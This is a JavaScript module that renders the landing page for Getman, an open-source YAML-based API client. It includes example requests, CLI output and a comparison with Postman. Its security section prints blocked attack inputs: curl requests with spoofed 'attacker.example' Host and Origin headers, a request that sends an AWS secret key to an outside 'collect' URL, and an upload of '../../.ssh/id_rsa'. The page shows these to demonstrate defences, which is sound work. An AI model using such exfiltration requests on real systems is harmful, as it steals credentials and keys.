// The landing page: a specimen sheet for an API client. Each claim is set
// as a working specimen of the product, with its caption under it.

import { bar, footer, head, palette } from "./layout.mjs";
import { icon } from "./icons.mjs";

// Three requests from `getman init --example`, with the responses
// JSONPlaceholder gave them on 14 October 2026, recorded with
// `getman send --json`.
const examples = [
  {
    file: "posts/list-posts.yaml",
    method: "GET",
    yaml: `name: List posts
method: GET
url: '{{baseUrl}}/posts?_limit=5'
checks:
- status == 200
- header.content-type contains json
- json.length == 5
- json[0].id exists`,
    status: 200,
    reason: "OK",
    time: 552,
    size: "1.4 kB",
    checks: [
      ["status == 200"],
      ["header.content-type contains json"],
      ["json.length == 5"],
      ["json[0].id exists"],
    ],
  },
  {
    file: "posts/create-a-post.yaml",
    method: "POST",
    yaml: `name: Create a post
method: POST
url: '{{baseUrl}}/posts'
body:
  type: json
  content: |
    {
      "title": "{{$randomWords}}",
      "body": "{{$randomLoremSentence}}",
      "userId": 1
    }
checks:
- status == 201
- json.id is number
captures:
  newPostId: json.id`,
    status: 201,
    reason: "Created",
    time: 682,
    size: "150 B",
    checks: [["status == 201"], ["json.id is number"]],
  },
  {
    file: "posts/get-a-missing-post.yaml",
    method: "GET",
    yaml: `name: Get a missing post
url: "{{baseUrl}}/posts/999"
checks:
  - status == 200
  - json.title is string`,
    status: 404,
    reason: "Not Found",
    time: 542,
    size: "2 B",
    checks: [
      ["status == 200", "status is 404; expected == 200"],
      ["json.title is string", "json.title does not exist"],
    ],
  },
];

const escape = (text) =>
  String(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

// The app's status classes: a 5xx is reversed out of a red block, a 4xx
// is a red numeral on the red halftone.
function tone(status) {
  if (status >= 500) return "server";
  if (status >= 400) return "client";
  if (status >= 300) return "redirect";
  return "ok";
}

function result(example, highlight) {
  const failed = example.checks.filter(([, failure]) => failure).length;
  const passed = example.checks.length - failed;
  const checks = example.checks
    .map(
      ([check, failure]) =>
        `<li class="${failure ? "fail" : "pass"}"><span class="tick">${icon(failure ? "close" : "check")}</span><code>${escape(check)}</code>${
          failure ? `<span class="why">${escape(failure)}</span>` : ""
        }</li>`,
    )
    .join("");
  return `<div class="sheet">
      <p class="sheet-path">${icon("file")}<span>${example.file}</span></p>
      ${highlight(example.yaml, "yaml")}
    </div>
    <div class="result">
      <p class="status"><span class="numeral bitmap">${example.status}</span><span class="reason bitmap">${example.reason}</span></p>
      <dl class="sizes">
        <div><dt>Time</dt><dd>${example.time} ms</dd></div>
        <div><dt>Size</dt><dd>${example.size}</dd></div>
        <div><dt>Protocol</dt><dd>2</dd></div>
        <div><dt>Checks</dt><dd class="${failed ? "bad" : "good"}">${passed}/${example.checks.length}</dd></div>
      </dl>
      <ul class="checks" aria-label="Checks">${checks}</ul>
    </div>`;
}

function plate(highlight) {
  const tabs = examples
    .map(
      (example, i) =>
        `<button type="button" role="tab" id="example-${i}" aria-selected="${i === 0}" aria-controls="example-panel" tabindex="${i === 0 ? 0 : -1}" data-example="${i}"><span class="m ${example.method.toLowerCase()}">${example.method}</span>${example.file.split("/").pop()}</button>`,
    )
    .join("");
  const templates = examples
    .map(
      (example, i) =>
        `<template data-example="${i}" data-status="${example.status}" data-time="${example.time}" data-tone="${tone(example.status)}">${result(example, highlight)}</template>`,
    )
    .join("");
  const first = examples[0];
  return `<figure class="plate">
    <div class="plate-tabs" role="tablist" aria-label="Example requests">${tabs}</div>
    <div class="plate-body tone-${tone(first.status)}" id="example-panel" role="tabpanel" aria-labelledby="example-0" aria-live="polite" data-time="${first.time}">
      <svg class="halftone" aria-hidden="true"></svg>
      <div class="plate-content">${result(first, highlight)}</div>
    </div>
    ${templates}
    <figcaption class="caption">Requests from getman init --example, sent to JSONPlaceholder. The dots darken as a response takes longer.</figcaption>
  </figure>`;
}

const diff = [
  [" ", "name: Create order"],
  [" ", "method: POST"],
  [" ", 'url: "{{baseUrl}}/orders"'],
  ["+", "headers:"],
  ["+", "  - name: Idempotency-Key"],
  ["+", '    value: "{{$uuid}}"'],
  [" ", "checks:"],
  [" ", "  - status == 201"],
  ["-", "  - time < 800"],
  ["+", "  - time < 500"],
];

function diffBlock() {
  const lines = diff
    .map(([kind, text]) => {
      const cls = kind === "+" ? "add" : kind === "-" ? "del" : "ctx";
      const html = escape(text).replace(/\{\{([^{}]+)\}\}/g, '<span class="v">{{$1}}</span>');
      return `<span class="line ${cls}"><span class="sign" aria-hidden="true">${kind}</span>${html}</span>`;
    })
    .join("");
  return `<figure class="code diff"><figcaption><span class="path">api/orders/create-order.yaml</span><span class="diffstat"><span class="plus">+4</span> <span class="minus">−1</span></span></figcaption><pre class="shiki"><code>${lines}</code></pre></figure>`;
}

const tree = `<pre class="tree" aria-label="A repository with a Getman workspace in api/"><code>shop/
├── src/
└── api/
    ├── getman.yaml            <span class="commit">commit</span>
    ├── environments/
    │   ├── staging.yaml       <span class="commit">commit</span>
    │   └── staging.local.yaml <span class="local">yours only</span>
    └── orders/
        ├── _folder.yaml       <span class="commit">commit</span>
        └── create-order.yaml  <span class="commit">commit</span></code></pre>`;

// Real output from the example workspace, with one request added that
// asks for a post that does not exist.
const runOutput = `$ getman run -e public
getman Blog API with the public environment: 4 requests

  ✓ GET     List posts          200 OK 609 ms · 1.4 kB
      ✓ status == 200
      ✓ header.content-type contains json
      ✓ json.length == 5
      ✓ json[0].id exists
  ✓ GET     Get a post          200 OK 202 ms · 292 B
      ✓ returns the post
  ✓ POST    Create a post       201 Created 294 ms · 107 B
      ✓ status == 201
      ✓ json.id is number
  ✗ GET     Get a missing post  404 Not Found 206 ms · 2 B
      ✗ status == 200
        status is 404; expected == 200
      ✗ json.title is string
        json.title does not exist

  Requests  4 run · 1 failed · 0 skipped
  Tests     1 passed · 0 failed
  Checks    6 passed · 2 failed
  Time      1.33 s total · 328 ms average response

  Failed.`;

const sendOutput = `$ getman send posts/get-a-post.yaml -e public | jq .title
200 OK · 534 ms · 292 B
✓ returns the post
"sunt aut facere repellat provident occaecati excepturi optio reprehenderit"

$ getman export posts/list-posts.yaml --to curl -e public
curl 'https://jsonplaceholder.typicode.com/posts?_limit=5'`;

const checkSpecimens = [
  ["status == 201", "The status code"],
  ["time < 500", "Answered in under half a second"],
  ["header.content-type contains json", "A response header, in any case"],
  ["json.items[-1].price > 0", "A JSON path, counted from the end"],
  ["json.email matches ^[^@]+@example\\.com$", "A regular expression"],
  ["json.id is integer", "A JSON type"],
];

const ledger = [
  [
    "An account to save requests and use environments",
    "None. There are no accounts.",
    'Required. Signed out, the <a href="https://learning.postman.com/docs/getting-started/using-api-client" rel="noopener">lightweight API Client</a> sends requests and keeps history; saving to collections and environments need a workspace.',
  ],
  [
    "People on the free plan",
    "No limit",
    '1 user on Free; teams from $19 per user per month, billed annually (<a href="https://www.postman.com/pricing/" rel="noopener">pricing</a>)',
  ],
  [
    "Where requests are stored",
    "Only your repository, one YAML file per request",
    'Postman’s cloud, or YAML in a Git repository connected to a Postman workspace (<a href="https://www.postman.com/product/native-git/" rel="noopener">Native Git</a>)',
  ],
  [
    "Source code",
    "Open, MIT or Apache-2.0",
    'Proprietary, licensed under Postman’s <a href="https://www.postman.com/legal/terms/" rel="noopener">terms of service</a>; Newman and some libraries are <a href="https://github.com/postmanlabs" rel="noopener">open source</a>',
  ],
  [
    "Interfaces",
    "Browser UI, terminal UI and command line, in one binary",
    'Desktop and web apps, and the <a href="https://learning.postman.com/docs/postman-cli/postman-cli-overview/" rel="noopener">Postman CLI</a>',
  ],
  [
    "Scripts",
    "JavaScript with <code>gm</code>; <code>pm</code> is an alias",
    'JavaScript with <code>pm</code> (<a href="https://learning.postman.com/docs/tests-and-scripts/write-scripts/test-examples" rel="noopener">examples</a>)',
  ],
  [
    "Assertions without code",
    "Checks such as <code>status == 200</code>",
    'Written as JavaScript tests, which its AI <a href="https://blog.postman.com/testing-apis-with-postman-agent-mode-a-practical-guide/" rel="noopener">Agent Mode</a> can generate',
  ],
];

// Recorded on 14 October 2026 against `getman` serving the example
// workspace on its default port, and with the build of the same day.
const serverOutput = `$ curl -s -w "\\n%{http_code}\\n" http://127.0.0.1:7878/api/workspace
{"error":"This page is not signed in to Getman. Open the link Getman printed in your terminal.","code":"token"}
401

$ curl -s -w "\\n%{http_code}\\n" -H "Host: getman.attacker.example" \\
    http://127.0.0.1:7878/
Getman only answers requests addressed to 127.0.0.1 or localhost
403

$ curl -s -w "\\n%{http_code}\\n" -H "Origin: https://attacker.example" \\
    http://127.0.0.1:7878/api/workspace
Getman does not answer requests from other web pages
403`;

const workspaceOutput = `$ getman export shared/read-a-secret.yaml
warning: {{$env.AWS_SECRET_ACCESS_KEY}} was not read: only environment variables named GETMAN_* can be read
curl 'https://example.com/collect?key={{$env.AWS_SECRET_ACCESS_KEY}}'

$ getman send shared/upload-a-key.yaml
error: "../../.ssh/id_rsa" is outside the workspace; files must be inside it`;

const guides = [
  ["getting-started", "Getting started", "Install, a first workspace, the keyboard"],
  ["workspaces", "Workspaces", "The files, and what to commit"],
  ["variables", "Variables and environments", "Scopes, dynamic values and secrets"],
  ["checks", "Checks and captures", "Tests without code"],
  ["scripts", "Scripts", "The gm JavaScript API"],
  ["runner", "Running in CI", "getman run, reports, GitHub Actions and GitLab"],
  ["import-export", "Import and export", "Postman, cURL and code"],
  ["terminal", "Terminal UI", "Every key"],
  ["cli", "Command line", "Every command and option"],
  ["security", "Security and privacy", "How the local server defends itself"],
];

/** A command that may wrap on narrow screens, but only after a slash. */
function breakable(command) {
  return escape(command).replace(/\//g, "/<wbr>");
}

function install() {
  return `<div class="install" data-install>
    <label class="os">
      <span class="sr-only">Your system</span>
      <select data-os>
        <option value="unix">macOS · Linux</option>
        <option value="windows">Windows</option>
      </select>
    </label>
    <code class="command" data-command data-unix="curl -fsSL https://fzn0x.github.io/getman/install.sh | sh" data-windows="irm https://fzn0x.github.io/getman/install.ps1 | iex">${breakable("curl -fsSL https://fzn0x.github.io/getman/install.sh | sh")}</code>
    <button class="btn primary copy-command" type="button" data-copy-command>${icon("copy")}<span>Copy</span></button>
  </div>`;
}

export function landing({ root, assets, site, highlight, codeBlock }) {
  const description =
    "Getman is a free, open-source API client with no account and no cloud. Requests are YAML files in your repository, opened in your browser, your terminal and CI.";
  return `${head({ root, assets, title: "Getman", description, canonical: site, site })}
<body class="home">
${bar({ root, current: "" })}
<main id="content">

<section class="hero" aria-labelledby="hook">
  <h1 id="hook" class="hook bitmap">The API client that lives in your repo</h1>
  <p class="lead">Getman sends, tests and runs HTTP requests stored as YAML files beside your code: no account, no cloud, one program of about 13&nbsp;MB for your browser, terminal and CI.</p>
  ${install()}
  <p class="after-install">Then <code>getman init --example</code> and <code>getman</code>. <a href="${root}docs/getting-started.html#install">Other ways to install</a> · <a href="${root}docs/why-getman.html">Why not Postman?</a></p>
  ${plate(highlight)}
</section>

<section class="band" aria-labelledby="files">
  <div class="band-head">
    <h2 id="files" class="bitmap">Requests are files you own</h2>
    <p>Each request is a short YAML file beside the code it calls. Review a change in a pull request, grep for an endpoint, or move a folder with <code>git mv</code>. Tokens and personal values go in git-ignored <code>*.local.yaml</code> files, so the rest is safe to commit.</p>
  </div>
  <div class="pair">
    <figure>
      ${tree}
      <figcaption class="caption">A workspace in a repository. Two kinds of file stay on your machine.</figcaption>
    </figure>
    <figure>
      ${diffBlock()}
      <figcaption class="caption">A request change, as a reviewer sees it in a pull request.</figcaption>
    </figure>
  </div>
  <p class="more"><a href="${root}docs/workspaces.html">The workspace format ${icon("right", 7)}</a></p>
</section>

<section class="band" aria-labelledby="ways">
  <div class="band-head">
    <h2 id="ways" class="bitmap">One file, three ways in</h2>
    <p>The same files open in your browser, in your terminal and in CI. Nothing is exported, synced or uploaded between them, so the request you try by hand is the test CI runs.</p>
  </div>
  <figure class="screen">
    <img class="light" src="${root}images/getman-light.png" width="1280" height="800" loading="lazy" decoding="async" alt="Getman in the browser: a request's four checks beside its response, a 200 on a green halftone field">
    <img class="dark" src="${root}images/getman-dark.png" width="1280" height="800" loading="lazy" decoding="async" alt="Getman in the browser, dark theme: a request's four checks beside its response, a 200 on a green halftone field">
    <figcaption class="caption">In the browser: getman serves the UI on 127.0.0.1 and opens it.</figcaption>
  </figure>
  <div class="pair">
    <figure>
      <h3 class="bitmap">In CI</h3>
      ${codeBlock(runOutput, "terminal")}
      <figcaption class="caption">getman run exits with 1 when a check fails, and writes JUnit for your CI.</figcaption>
    </figure>
    <figure>
      <h3 class="bitmap">In a terminal</h3>
      ${codeBlock(sendOutput, "terminal")}
      <figcaption class="caption">getman send fits in a pipeline; getman tui opens the whole workspace over SSH.</figcaption>
    </figure>
  </div>
  <p class="more"><a href="${root}docs/runner.html">Running in CI ${icon("right", 7)}</a></p>
</section>

<section class="band" aria-labelledby="checks">
  <div class="band-head">
    <h2 id="checks" class="bitmap">Tests without code</h2>
    <p>Most API tests fit on one line, so Getman lets you write them as checks: a target, an operator and a value. Scripts are there for the rest, with an assertion library, JSON Schema and <code>sendRequest</code>, and Postman's <code>pm</code> API works in them.</p>
  </div>
  <dl class="specimens">
    ${checkSpecimens
      .map(
        ([check, meaning]) =>
          `<div><dt><code>${escape(check)}</code></dt><dd>${meaning}</dd></div>`,
      )
      .join("")}
    <div class="capture"><dt><code>token: json.access_token</code></dt><dd>A capture: copied into a variable for the next request</dd></div>
  </dl>
  <p class="more"><a href="${root}docs/checks.html">Every target and operator ${icon("right", 7)}</a></p>
</section>

<section class="band" aria-labelledby="why">
  <div class="band-head">
    <h2 id="why" class="bitmap">Why Getman over Postman</h2>
    <p>Postman is a capable platform with a cloud at its centre. Getman makes the opposite choice: your machine and your repository are the whole product. Postman's side of this table was checked against its own pages on 14&nbsp;October 2026.</p>
  </div>
  <div class="table ledger">
    <table>
      <thead><tr><th scope="col"><span class="sr-only">Question</span></th><th scope="col"><span class="mark-getman"><span class="square" aria-hidden="true"></span>Getman</span></th><th scope="col">Postman</th></tr></thead>
      <tbody>${ledger.map(([q, g, p]) => `<tr><th scope="row">${q}</th><td data-label="Getman"><span>${g}</span></td><td data-label="Postman"><span>${p}</span></td></tr>`).join("")}</tbody>
    </table>
  </div>
  <div class="stay">
    <h3 class="bitmap">When Postman is the better choice</h3>
    <ul>
      <li><strong>Other protocols.</strong> Getman sends HTTP. Postman also handles WebSocket, gRPC, MQTT and Socket.IO.</li>
      <li><strong>Hosted features.</strong> Mock servers, scheduled monitors and API publishing need a server someone runs for you.</li>
      <li><strong>Real-time collaboration.</strong> Getman shares work through Git, not live workspaces and comments.</li>
      <li><strong>A long track record.</strong> Postman has years of integrations and a large community. Getman is new.</li>
    </ul>
  </div>
  <p class="more"><a href="${root}docs/why-getman.html">The full comparison ${icon("right", 7)}</a></p>
</section>

<section class="band" aria-labelledby="safe">
  <div class="band-head">
    <h2 id="safe" class="bitmap">Nothing leaves your machine</h2>
    <p>No account, no telemetry, no update checks. Getman sends the requests you send, and nothing else. The UI's server listens on 127.0.0.1 only, and a workspace someone sends you stays inside its folder.</p>
  </div>
  <div class="pair">
    <figure>
      <h3 class="bitmap">Other web pages</h3>
      ${codeBlock(serverOutput, "terminal", { wrap: true })}
      <figcaption class="caption">Without the token from your terminal, under another host name or from another site, the local server refuses. The last two stop DNS rebinding and cross-site requests.</figcaption>
    </figure>
    <figure>
      <h3 class="bitmap">A workspace someone sent you</h3>
      ${codeBlock(workspaceOutput, "terminal", { wrap: true })}
      <figcaption class="caption">Requests read only environment variables named GETMAN_*, and upload only files inside the workspace.</figcaption>
    </figure>
  </div>
  <p class="more"><a href="${root}docs/security.html">Security and privacy ${icon("right", 7)}</a></p>
</section>

<section class="band" aria-labelledby="move">
  <div class="band-head">
    <h2 id="move" class="bitmap">Move a collection in four steps</h2>
    <p>Export from Postman as Collection v2.1. Folders, requests, auth, scripts and variables come across, and the import lists anything it could not carry.</p>
  </div>
  <ol class="steps">
    <li><span class="n bitmap">1</span><div><p>Install Getman.</p>${install().replace("data-install", "data-install data-second").replace(" primary", "")}</div></li>
    <li><span class="n bitmap">2</span><div><p>In Postman, export the collection as <strong>Collection v2.1</strong> and each environment as JSON.</p></div></li>
    <li><span class="n bitmap">3</span><div><p>Import them into a new workspace in your repository.</p>${codeBlock('getman init\ngetman import "My API.postman_collection.json" --root\ngetman import "Staging.postman_environment.json"', "sh")}</div></li>
    <li><span class="n bitmap">4</span><div><p>Open it, or run it all.</p>${codeBlock("getman\ngetman run -e staging", "sh")}</div></li>
  </ol>
</section>

<section class="band index" aria-labelledby="docs">
  <div class="band-head">
    <h2 id="docs" class="bitmap">Documentation</h2>
    <p>Everything in Getman is a file or a command, and every one of them is written down.</p>
  </div>
  <ul class="guides">${guides
    .map(
      ([slug, title, line]) =>
        `<li><a href="${root}docs/${slug}.html"><span class="g-title">${title}</span><span class="g-line">${line}</span></a></li>`,
    )
    .join("")}</ul>
</section>

</main>
${footer({ root })}
${palette()}
</body>
</html>
`;
}
